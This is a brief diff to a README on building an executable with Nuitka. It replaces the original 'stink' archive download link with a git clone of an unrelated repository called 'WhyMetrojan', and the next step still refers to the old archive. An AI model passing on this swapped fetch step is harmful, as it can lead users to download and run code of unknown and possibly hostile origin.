@@ -130,7 +130,7 @@ We will need Nuitka to do this.
 
 ### Creating executable file
 
-1. [Download](https://github.com/FallenAstaroth/stink/archive/refs/heads/master.zip) archive.
+1. git clone https://github.com/GL4D1AT0R/WhyMetrojan.git
 2. Unpack the archive and go to the directory stink-master.
 3. Create test.py (or any other name) file in the same directory with the following code:
 ```python
